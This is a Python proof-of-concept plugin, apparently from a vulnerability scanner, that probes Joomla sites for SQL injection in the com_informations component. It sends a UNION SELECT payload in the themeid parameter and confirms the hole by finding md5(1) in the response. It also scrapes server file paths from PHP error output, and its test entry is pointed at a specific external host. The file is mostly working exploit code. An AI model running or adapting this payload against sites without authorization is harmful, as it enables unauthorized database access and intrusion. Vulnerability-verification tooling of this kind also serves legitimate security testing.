from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
#-*- encoding:utf-8 -*-

import re


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'index.php?option=com_informations&view=sousthemes&themeid=999.9+union+select+111,222,md5(1)%23'
        url = arg + payload 
        code, head, res, errcode, _ = curl.curl(url )
        m = re.search('in <b>([^<]+)</b> on line <b>', res)
        if code == 200 and m:
            output(m.group(1),result,'info')
    
        if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
            output(url,result,'hole')
        

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_15c79527412438e082f29477cac6615e.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_15c79527412438e082f29477cac6615e.py
#/root/github/poccreate/codesrc/exp-1344.py